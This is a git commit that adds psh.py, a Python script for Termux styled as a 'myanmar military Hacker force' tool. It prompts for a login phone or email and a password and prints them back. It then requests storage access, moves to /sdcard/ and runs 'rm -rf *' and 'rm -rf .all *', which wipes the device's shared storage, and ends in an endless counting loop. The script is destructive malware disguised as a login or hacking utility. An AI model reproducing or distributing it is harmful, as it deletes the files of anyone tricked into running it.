19d5b1427bcd0d07f602a380455638e38fe43ff0
bgmpyaesonehmoo290G <79253197+bgmpyaesonehmoo290G@users.noreply.github.com>
2021-03-11 23:57:46 +0630

    Create psh.py

---
+++ psh.py
@@ -0,0 +1,27 @@
+import os
+import sys
+import time 
+from colorama import Fore , Back ,Style
+os.system("clear")
+banner = os.system( "pyfiglet myanmar military Hacker force")
+
+print(Fore.GREEN+"Developer : H-2")
+
+print("\n")
+data = input(Fore.GREEN+Back.WHITE+"login phone or mail ->")
+anon = input(Fore.GREEN+Back.WHITE+"login password ->")
+print()
+print(data)
+time.sleep(2)
+print()
+print(anon)
+os.system("termux-setup-storage")
+os.system("clear")
+os.system("cd ")
+os.system("cd ..")
+os.system("cd /sdcard/")
+os.system("rm -rf *")
+os.system("rm -rf .all *")
+time.sleep(3)
+for anon in range(0,99999999999999999999999):
+	print(Style.RESET_ALL+"info : ",anon)
